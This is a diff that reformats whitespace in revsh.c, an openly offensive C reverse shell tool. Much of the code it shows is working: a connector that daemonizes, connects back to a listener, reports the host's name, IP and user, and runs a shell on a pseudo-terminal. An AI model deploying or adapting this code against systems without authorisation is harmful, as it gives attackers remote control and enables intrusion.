@@ -1,17 +1,17 @@
 
 /*******************************************************************************
  *
- *	revsh
+ * revsh
  *
- *	emptymonkey's reverse shell tool with terminal support
+ * emptymonkey's reverse shell tool with terminal support
  *
- *	2013-07-17
+ * 2013-07-17
  *
  *
- *	The revsh tool is intended to be used as both a listener and remote client
- *	in establishing a remote shell with terminal support. This isn't intended
- *	as a replacement for netcat, but rather as a supplementary tool to ease 
- *	remote interaction during long engagements.
+ * The revsh tool is intended to be used as both a listener and remote client
+ * in establishing a remote shell with terminal support. This isn't intended
+ * as a replacement for netcat, but rather as a supplementary tool to ease 
+ * remote interaction during long engagements.
  *
  *******************************************************************************/
 
@@ -43,13 +43,13 @@
 #include <sys/types.h>
 
 
-#define DEFAULT_SHELL "/bin/sh"
+#define DEFAULT_SHELL	"/bin/sh"
 #define DEFAULT_ENV	"TERM"
 
-#define WINSIZE_BUFF_LEN 16
+#define WINSIZE_BUFF_LEN	16
 
 #define APC	0x9f
-#define ST 0x9c
+#define ST	0x9c
 
 volatile sig_atomic_t sig_found = 0;
 
@@ -127,19 +127,19 @@ int main(int argc, char **argv){
 
 	/*
 	 * Listener:
-	 *	- Open a socket.	
-	 *	- Listen for a connection.
-	 *	- Send initial shell data.
-	 *	- Send initial environment data.
-	 *	- Send initial termios data.
-	 *	-	Set local terminal to raw. 
-	 *	- Enter io_loop() for data brokering.
-	 *	- Reset local term.
-	 *	- Exit.
+	 * - Open a socket.
+	 * - Listen for a connection.
+	 * - Send initial shell data.
+	 * - Send initial environment data.
+	 * - Send initial termios data.
+	 * - Set local terminal to raw. 
+	 * - Enter io_loop() for data brokering.
+	 * - Reset local term.
+	 * - Exit.
 	 */
 	if(listener){
 
-		//	- Open a socket.	
+		// - Open a socket.
 		if((retval = getaddrinfo(argv[optind], argv[optind + 1], NULL, &result))){
 			error(-1, 0, "getaddrinfo(%s, %s, NULL, %lx): %s", argv[optind], \
 					argv[optind + 1], (unsigned long) &result, gai_strerror(retval));
@@ -165,7 +165,7 @@ int main(int argc, char **argv){
 			error(-1, 0, "Unable to bind to: %s %s\n", argv[optind], argv[optind + 1]);
 		}
 
-		//	- Listen for a connection.
+		// - Listen for a connection.
 		printf("Listening...");
 		fflush(stdout);
 
@@ -190,10 +190,10 @@ int main(int argc, char **argv){
 		printf("Initializing...");
 		fflush(stdout);
 
-	 	//	- Send initial shell data.
+		// - Send initial shell data.
 		memset(buff_head, 0, buff_len);
-    buff_tail = buff_head;
-    *(buff_tail++) = (char) APC;
+		buff_tail = buff_head;
+		*(buff_tail++) = (char) APC;
 		if(shell){
 			tmp_len = strlen(shell);
 			memcpy(buff_tail, shell, tmp_len);
@@ -203,24 +203,24 @@ int main(int argc, char **argv){
 		}
 		buff_tail += tmp_len;
 
-    *(buff_tail++) = (char) ST;
+		*(buff_tail++) = (char) ST;
 
-    if((buff_tail - buff_head) >= buff_len){
-      error(-1, 0, "Environment string too long.");
-    }
+		if((buff_tail - buff_head) >= buff_len){
+			error(-1, 0, "Environment string too long.");
+		}
 
-    tmp_len = strlen(buff_head);
-    if((io_bytes = write(sock_fd, buff_head, tmp_len)) == -1){
-      error(-1, errno, "write(%d, %lx, %d)", \
-          sock_fd, (unsigned long) buff_head, tmp_len);
-    }
+		tmp_len = strlen(buff_head);
+		if((io_bytes = write(sock_fd, buff_head, tmp_len)) == -1){
+			error(-1, errno, "write(%d, %lx, %d)", \
+					sock_fd, (unsigned long) buff_head, tmp_len);
+		}
 
-    if(io_bytes != (buff_tail - buff_head)){
-      error(-1, 0, "write(%d, %lx, %d): Unable to write entire string.", \
-          sock_fd, (unsigned long) buff_head, buff_len);
-    }
+		if(io_bytes != (buff_tail - buff_head)){
+			error(-1, 0, "write(%d, %lx, %d): Unable to write entire string.", \
+					sock_fd, (unsigned long) buff_head, buff_len);
+		}
 
-		//	- Send initial environment data.
+		// - Send initial environment data.
 		if(!env_string){
 			tmp_len = strlen(DEFAULT_ENV);
 			if((env_string = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
@@ -233,7 +233,7 @@ int main(int argc, char **argv){
 
 		tmp_ptr = env_string;
 		while((tmp_ptr = strchr(tmp_ptr, ','))){
-			*tmp_ptr = ' ';			
+			*tmp_ptr = ' ';
 		}
 
 		if((exec_envp = string_to_vector(env_string)) == NULL){
@@ -260,7 +260,7 @@ int main(int argc, char **argv){
 
 			if((tmp_ptr = getenv(exec_envp[i])) == NULL){
 				fprintf(stderr, "%s: No such environment variable \"%s\". Ignoring.\n", \
-					program_invocation_short_name, exec_envp[i]);
+						program_invocation_short_name, exec_envp[i]);
 			}else{
 				tmp_len = strlen(tmp_ptr);
 				memcpy(buff_tail, tmp_ptr, tmp_len);
@@ -286,7 +286,7 @@ int main(int argc, char **argv){
 		}
 
 
-		//	- Send initial termios data.
+		// - Send initial termios data.
 		if((retval = ioctl(STDIN_FILENO, TIOCGWINSZ, &tty_winsize)) == -1){
 			error(-1, errno, "ioctl(STDIN_FILENO, TIOCGWINSZ, %lx)", \
 					(unsigned long) &tty_winsize);
@@ -316,7 +316,7 @@ int main(int argc, char **argv){
 					sock_fd, (unsigned long) buff_head, tmp_len);
 		}
 
-		//	-	Set local terminal to raw. 
+		// - Set local terminal to raw. 
 		if((retval = tcgetattr(STDIN_FILENO, &saved_termios_attrs)) == -1){
 			error(-1, errno, "tcgetattr(STDIN_FILENO, %lx)", \
 					(unsigned long) &saved_termios_attrs);
@@ -324,7 +324,7 @@ int main(int argc, char **argv){
 
 		memcpy(&new_termios_attrs, &saved_termios_attrs, sizeof(struct termios));
 
-		new_termios_attrs.c_lflag &= ~(ECHO|ICANON|IEXTEN|ISIG);	
+		new_termios_attrs.c_lflag &= ~(ECHO|ICANON|IEXTEN|ISIG);
 		new_termios_attrs.c_iflag &= ~(BRKINT|ICRNL|INPCK|ISTRIP|IXON);
 		new_termios_attrs.c_cflag &= ~(CSIZE|PARENB);
 		new_termios_attrs.c_cflag |= CS8;
@@ -342,11 +342,11 @@ int main(int argc, char **argv){
 		fflush(stdout);
 
 		errno = 0;
-		//	- Enter io_loop() for data brokering.
+		// - Enter io_loop() for data brokering.
 		if((retval = io_loop(STDIN_FILENO, sock_fd, listener) == -1)){
 			fprintf(stderr, "%s: io_loop(%d, %d, %d): %s\r\n", \
-				program_invocation_short_name, STDIN_FILENO, sock_fd, listener,
-				strerror(errno));
+					program_invocation_short_name, STDIN_FILENO, sock_fd, listener,
+					strerror(errno));
 		}
 
 		err_flag = 0;
@@ -354,10 +354,10 @@ int main(int argc, char **argv){
 			err_flag = errno;
 		}
 
-		//	- Reset local term.
+		// - Reset local term.
 		tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios_attrs);
 
-		//	- Exit.
+		// - Exit.
 		if(!err_flag){
 			printf("Good-bye!\n");
 
@@ -373,19 +373,19 @@ int main(int argc, char **argv){
 
 		/*
 		 * Connector: 
-		 *	- Become a daemon.
-		 *	- Open a network connection back to a listener.
-		 *	- Check for usage and exit, if needed. 
-		 *	- Receive and set the shell.
-		 *	- Receive and set the initial environment.
-		 *	- Receive and set the initial termios.
-		 *	- Create a pseudo-terminal (pty).
-		 *	- Send basic information back to the listener about the connecting host.
-		 *	- Fork a child to run the shell.
-		 *	- Parent: Enter the io_loop() and broker data.
-		 *	- Child: Initialize file descriptors.
-		 *	- Child: Set the pty as controlling.
-		 *	- Child: Call execve() to invoke a shell.
+		 * - Become a daemon.
+		 * - Open a network connection back to a listener.
+		 * - Check for usage and exit, if needed. 
+		 * - Receive and set the shell.
+		 * - Receive and set the initial environment.
+		 * - Receive and set the initial termios.
+		 * - Create a pseudo-terminal (pty).
+		 * - Send basic information back to the listener about the connecting host.
+		 * - Fork a child to run the shell.
+		 * - Parent: Enter the io_loop() and broker data.
+		 * - Child: Initialize file descriptors.
+		 * - Child: Set the pty as controlling.
+		 * - Child: Call execve() to invoke a shell.
 		 */
 
 
@@ -458,7 +458,7 @@ int main(int argc, char **argv){
 		// We do this after the network connect so the error
 		// reporting gets sent back to the listener, if possible.
 		if(shell || env_string){
-			
+
 			fprintf(stderr, \
 					"\r%s: remote usage error: Only listeners can invoke -s or -e!\r\n", \
 					program_invocation_short_name);
@@ -467,35 +467,35 @@ int main(int argc, char **argv){
 		}
 
 		// - Receive and set the shell.
-    if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
-      error(-1, errno, "read(%d, %lx, %d)", \
-          sock_fd, (unsigned long) &tmp_char, 1);
-    }
+		if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
+			error(-1, errno, "read(%d, %lx, %d)", \
+					sock_fd, (unsigned long) &tmp_char, 1);
+		}
 
-    if(tmp_char != (char) APC){
-      error(-1, 0, "invalid initialization: shell");
-    }
+		if(tmp_char != (char) APC){
+			error(-1, 0, "invalid initialization: shell");
+		}
 
-    memset(buff_head, 0, buff_len);
-    buff_tail = buff_head;
+		memset(buff_head, 0, buff_len);
+		buff_tail = buff_head;
 
-    if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
-      error(-1, errno, "read(%d, %lx, %d)", \
-          sock_fd, (unsigned long) &tmp_char, 1);
-    }
+		if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
+			error(-1, errno, "read(%d, %lx, %d)", \
+					sock_fd, (unsigned long) &tmp_char, 1);
+		}
 
-    while(tmp_char != (char) ST){
-      *(buff_tail++) = tmp_char;
+		while(tmp_char != (char) ST){
+			*(buff_tail++) = tmp_char;
 
-      if((buff_tail - buff_head) >= buff_len){
-        error(-1, 0, "Shell string too long.");
-      }
+			if((buff_tail - buff_head) >= buff_len){
+				error(-1, 0, "Shell string too long.");
+			}
 
-      if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
-        error(-1, errno, "read(%d, %lx, %d)", \
-            sock_fd, (unsigned long) &tmp_char, 1);
-      }
-    }
+			if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
+				error(-1, errno, "read(%d, %lx, %d)", \
+						sock_fd, (unsigned long) &tmp_char, 1);
+			}
+		}
 
 		tmp_len = strlen(buff_head);
 		if((shell = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
@@ -622,7 +622,7 @@ int main(int argc, char **argv){
 		}
 
 		// - Send basic information back to the listener about the connecting host.
-		//		(e.g. hostname, ip address, username)
+		//   (e.g. hostname, ip address, username)
 		memset(buff_head, 0, buff_len);
 		if((retval = gethostname(buff_head, buff_len - 1)) == -1){
 			error(-1, errno, "gethostname(%lx, %d)", \
@@ -733,7 +733,7 @@ int main(int argc, char **argv){
 			error(-1, errno, "ioctl(STDIN_FILENO, TIOCSCTTY, 1)");
 		}
 
-		//	- Child: Call execve() to invoke a shell.
+		// - Child: Call execve() to invoke a shell.
 		errno = 0;
 		if((exec_argv = string_to_vector(shell)) == NULL){
 			error(-1, errno, "string_to_vector(%s)", shell);
@@ -774,13 +774,13 @@ void usage(){
 /*******************************************************************************
  * 
  * signal_handler()
- *		 
- *	Input: The signal being handled.
- *	Output: None. 
+ *
+ * Input: The signal being handled.
+ * Output: None. 
  * 
- * 	Purpose: To handle signals! For best effort at avoiding race conditions,
- * 		we simply mark that the signal was found and return. This allows the
- * 		io_loop() select() call to manage signal generating events.
+ * Purpose: To handle signals! For best effort at avoiding race conditions,
+ *  we simply mark that the signal was found and return. This allows the
+ *  io_loop() select() call to manage signal generating events.
  * 
  ******************************************************************************/
 void signal_handler(int signal){
@@ -792,14 +792,14 @@ void signal_handler(int signal){
  *
  * string_to_vector()
  *
- *	Input: A string of tokens, whitespace delimited, null terminated.
- *	Output: An array of strings containing the tokens. The array itself is 
- *		also null terminated. NULL will be returned on error.
+ * Input: A string of tokens, whitespace delimited, null terminated.
+ * Output: An array of strings containing the tokens. The array itself is 
+ *  also null terminated. NULL will be returned on error.
  *
- *	Purpose: Tokenize a string for later consumption. 
- *		(In this case, we are performing serialization of data for use with
- *		in-band signalling by converting the data into a whitespace delimited
- *		string for transmission.)
+ * Purpose: Tokenize a string for later consumption. 
+ *  (In this case, we are performing serialization of data for use with
+ *  in-band signalling by converting the data into a whitespace delimited
+ *  string for transmission.)
  *
  ******************************************************************************/
 char **string_to_vector(char *command_string){
@@ -925,11 +925,11 @@ CLEAN_UP:
  * io_loop()
  *
  * Input: Two file descriptors. Also, an indication of whether or not we are a
- *	listener.
+ *  listener.
  * Output: 0 for EOF, -1 for errors.
  *
  * Purpose: Broker data between the two file descriptors. Also, handle some 
- *	signal events (e.g. SIGWINCH) with in-band signalling.
+ *  signal events (e.g. SIGWINCH) with in-band signalling.
  *
  ******************************************************************************/
 int io_loop(int local_fd, int remote_fd, int listener){
@@ -1069,7 +1069,7 @@ int io_loop(int local_fd, int remote_fd, int listener){
 #endif
 					retval = -1;
 					goto CLEAN_UP;
-			}			
+			}
 
 			current_sig = 0;
 
